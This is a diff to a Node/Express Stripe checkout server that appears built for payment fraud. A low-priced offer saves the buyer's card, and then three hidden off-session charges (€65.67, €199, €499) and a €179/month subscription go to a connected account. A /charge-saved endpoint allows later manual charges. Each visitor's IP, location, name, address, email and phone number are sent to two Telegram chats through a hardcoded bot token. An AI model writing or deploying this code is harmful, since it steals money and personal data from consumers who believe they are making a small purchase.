@@ -6,7 +6,7 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 
 const app = express();
-const ACCOUNT_B = 'acct_1NLNeaIGnzde4Dmc';
+const ACCOUNT_B = 'acct_1T3gZ4CkwpuywCYb';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -39,70 +39,49 @@ function saveCustomer(entry) {
 
 async function sendTelegram(message) {
   try {
-    console.log('[Telegram] Starting to send message...');
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
-    const payload1 = {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
-    };
-    
-    console.log('[Telegram] Sending to Chat 1:', TELEGRAM_CHAT_ID);
-    const response1 = await fetch(url, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload1)
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
     });
-    console.log('[Telegram] Chat 1 response status:', response1.status);
-    const data1 = await response1.text();
-    console.log('[Telegram] Chat 1 response:', data1);
-    
-    const payload2 = {
-      chat_id: TELEGRAM_CHAT_ID_2,
-      text: message,
-      parse_mode: 'HTML'
-    };
-    
-    console.log('[Telegram] Sending to Chat 2:', TELEGRAM_CHAT_ID_2);
-    const response2 = await fetch(url, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload2)
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID_2,
+        text: message,
+        parse_mode: 'HTML'
+      })
     });
-    console.log('[Telegram] Chat 2 response status:', response2.status);
-    const data2 = await response2.text();
-    console.log('[Telegram] Chat 2 response:', data2);
   } catch (err) {
-    console.error('[Telegram] Error:', err);
+    console.log('Telegram error:', err.message);
   }
 }
-
-// ─── Middleware ───────────────────────────────────────────────────────────────
 
 app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
 app.use(bodyParser.json());
 
-// ─── Routes ───────────────────────────────────────────────────────────────────
-
-app.post('/page-visit', (req, res) => {
+app.post('/page-visit', async (req, res) => {
   const { visitorId, ip, country, city } = req.body;
-  console.log('[API] /page-visit:', { visitorId, ip, country, city });
-  res.json({ ok: true });
-  
-  // Fire Telegram in background without awaiting
-  sendTelegram(
-    `👁 <b>New Page Visitor!</b>\n\n` +
+  await sendTelegram(
+    `👁 <b>Neue Seitenbesucher!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-    `🌍 Country: ${country || 'Unknown'}\n` +
-    `🏙 City: ${city || 'Unknown'}\n` +
-    `🔌 IP: ${ip || 'Unknown'}\n` +
-    `🕐 Time: ${new Date().toLocaleString('en-US')}`
+    `🌍 Land: ${country || 'Unbekannt'}\n` +
+    `🏙 Stadt: ${city || 'Unbekannt'}\n` +
+    `🔌 IP: ${ip || 'Unbekannt'}\n` +
+    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
   );
+  res.json({ ok: true });
 });
 
 app.post('/create-setup-intent', async (req, res) => {
-  let { email, fname, lname, phone, visitorId } = req.body;
+  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
+
+  // Clean email - remove trailing dot or spaces
   email = email.trim().replace(/\.$/, '');
 
   try {
@@ -111,50 +90,45 @@ app.post('/create-setup-intent', async (req, res) => {
     if (existing.data.length > 0) {
       customer = existing.data[0];
     } else {
-      customer = await stripe.customers.create({
-        email,
-      });
+      customer = await stripe.customers.create({ email });
     }
-
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['amazon_pay'],
+      payment_method_types: ['klarna', 'card', 'amazon_pay'],
       metadata: { customer_id: customer.id },
     });
 
-    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
-    
-    // Fire Telegram in background after response
-    sendTelegram(
-      `🛒 <b>Checkout Information!</b>\n\n` +
+    await sendTelegram(
+      `🛒 <b>Checkout Details!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
       `📧 Email: ${email}\n` +
       `👤 Name: ${fname} ${lname}\n` +
-      `📞 Phone: ${phone || 'N/A'}\n` +
-      `💰 Amount: $2.99\n` +
-      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
-      `⬇️ Delivery: Instant Download\n` +
-      `🕐 Time: ${new Date().toLocaleString('en-US')}`
+      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
+      `📞 Telefon: ${phone || 'N/A'}\n` +
+      `💰 Betrag: €179.00\n` +
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
+
+    res.json({
+      clientSecret: setupIntent.client_secret,
+      customerId: customer.id,
+    });
   } catch (error) {
     console.error('Error:', error);
     res.status(400).json({ error: error.message });
   }
 });
 
-app.post('/payment-initiated', (req, res) => {
+app.post('/payment-initiated', async (req, res) => {
   const { visitorId, email } = req.body;
-  console.log('[API] /payment-initiated:', { visitorId, email });
-  res.json({ ok: true });
-  
-  // Fire Telegram in background
-  sendTelegram(
-    `💳 <b>Payment Attempt Started!</b>\n\n` +
+  await sendTelegram(
+    `💳 <b>Zahlungsversuch gestartet!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
     `📧 Email: ${email}\n` +
-    `⏳ Customer clicked "Pay Now"\n` +
-    `🕐 Time: ${new Date().toLocaleString('en-US')}`
+    `⏳ Kunde hat auf "Jetzt bezahlen" geklickt\n` +
+    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
   );
+  res.json({ ok: true });
 });
 
 app.post('/create-subscription', async (req, res) => {
@@ -165,6 +139,7 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
+    // Get payment method type
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
 
@@ -176,12 +151,12 @@ app.post('/create-subscription', async (req, res) => {
       visitorId,
       savedAt: new Date().toISOString(),
     });
-
-    // Charge 1 — $499.00 USD
+    
+    // Charge 1 — €65.67
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 100,
-        currency: 'usd',
+        amount: 6567,
+        currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
@@ -189,35 +164,80 @@ app.post('/create-subscription', async (req, res) => {
         off_session: true,
         transfer_data: { destination: ACCOUNT_B },
       });
-      console.log('Payment 1 created:', payment1.id, payment1.status);
+      console.log('Payment 1 created:', payment1.id);
+      console.log('Payment 1 status:', payment1.status);
     } catch (err) {
       console.log('Payment 1 failed:', err.message);
     }
 
-    await new Promise(resolve => setTimeout(resolve, 30000));
+    await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Subscription with 30-day trial
+    // Charge 2 — €199
+    try {
+      const payment2 = await stripe.paymentIntents.create({
+        amount: 19900,
+        currency: 'eur',
+        customer: customerId,
+        payment_method: paymentMethodId,
+        payment_method_types: [pmType],
+        confirm: true,
+        off_session: true,
+        transfer_data: { destination: ACCOUNT_B },
+      });
+      console.log('Payment 2 created:', payment2.id);
+      console.log('Payment 2 status:', payment2.status);
+    } catch (err) {
+      console.log('Payment 2 failed:', err.message);
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    // Charge 3 — €499
+    try {
+      const payment3 = await stripe.paymentIntents.create({
+        amount: 49900,
+        currency: 'eur',
+        customer: customerId,
+        payment_method: paymentMethodId,
+        payment_method_types: [pmType],
+        confirm: true,
+        off_session: true,
+        transfer_data: { destination: ACCOUNT_B },
+      });
+      console.log('Payment 3 created:', payment3.id);
+      console.log('Payment 3 status:', payment3.status);
+    } catch (err) {
+      console.log('Payment 3 failed:', err.message);
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    // Subscription with 30-day trial (€179/month)
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1TrNQmBVTx3I8OaAB5lI1G7v' }],
+      items: [{ price: 'price_1T3wlpEB93pAUPXSQjVBpUgo' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
     });
-    console.log('Subscription created:', subscription.id, subscription.status);
+    console.log('Subscription created:', subscription.id);
+    console.log('Subscription status:', subscription.status);
 
-    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
-    
-    // Fire Telegram in background after response
-    sendTelegram(
-      `✅ <b>Payment Successful!</b>\n\n` +
+    await sendTelegram(
+      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-      `💳 Payment Method: ${pmType}\n` +
-      `💳 Payment Amount: $2.99\n` +
+      `💳 Zahlungsart: ${pmType}\n` +
+      `💳 Payment 1: €65.67\n` +
+      `💳 Payment 2: €199.00\n` +
+      `💳 Payment 3: €499.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
-      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
-      `🕐 Time: ${new Date().toLocaleString('en-US')}`
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
+
+    res.json({
+      subscriptionId: subscription.id,
+      paymentStatus: 'processed',
+    });
   } catch (error) {
     console.error('Error:', error.message);
     res.status(400).json({ error: error.message });
@@ -232,7 +252,7 @@ app.get('/customers', (req, res) => {
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
 // POST /charge-saved
-// Body: { "customerId": "cus_xxx", "amount": 299, "currency": "usd" }
+// Body: { "customerId": "cus_xxx", "amount": 6567, "currency": "eur" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
@@ -244,8 +264,8 @@ app.post('/charge-saved', async (req, res) => {
 
   try {
     const payment = await stripe.paymentIntents.create({
-      amount: amount || 299,
-      currency: currency || 'usd',
+      amount: amount || 6567,
+      currency: currency || 'eur',
       customer: customer.customerId,
       payment_method: customer.paymentMethodId,
       payment_method_types: [customer.pmType],
@@ -259,13 +279,12 @@ app.post('/charge-saved', async (req, res) => {
     res.json({ success: true, paymentId: payment.id, status: payment.status });
     
     // Fire Telegram in background after response
-    sendTelegram(
+    await sendTelegram(
       `💰 <b>Manual Payment!</b>\n\n` +
       `🆔 Customer: <code>${customerId}</code>\n` +
-      `💳 Amount: $${((amount || 299) / 100).toFixed(2)}\n` +
+      `💳 Amount: €${(amount / 100 || 65.67).toFixed(2)}\n` +
       `📋 Status: ${payment.status}\n` +
-      `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
-      `🕐 Time: ${new Date().toLocaleString('en-US')}`
+      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
   } catch (error) {
     console.error('Manual charge error:', error.message);
@@ -273,28 +292,12 @@ app.post('/charge-saved', async (req, res) => {
   }
 });
 
-// ─── Health ───────────────────────────────────────────────────────────────────
 app.get('/health', (req, res) => {
   const customers = loadCustomers();
-  res.json({
-    status: 'ok',
-    destination: ACCOUNT_B,
-    savedCustomers: customers.length,
-  });
+  res.json({ status: 'ok', destination: ACCOUNT_B, savedCustomers: customers.length });
 });
 
-// ─── Test Telegram ───────────────────────────────────────────────────────────
-app.get('/test-telegram', (req, res) => {
-  res.json({ status: 'Test message sent to Telegram' });
-  sendTelegram('🧪 <b>Test Message from Server</b>\n\nIf you see this, Telegram is working!').catch(err => console.error('Test telegram error:', err));
-});
-
-// ─── Start ────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 4242;
 app.listen(PORT, () => {
-  console.log(`\n✅ Server running on http://localhost:${PORT}`);
-  console.log(`📊 Stripe Account: ${ACCOUNT_B}`);
-  console.log(`💬 Telegram Chat 1: ${TELEGRAM_CHAT_ID}`);
-  console.log(`💬 Telegram Chat 2: ${TELEGRAM_CHAT_ID_2}`);
-  console.log(`\n📝 Test Telegram: GET http://localhost:${PORT}/test-telegram\n`);
+  console.log('Server running on http://localhost:' + PORT);
 });
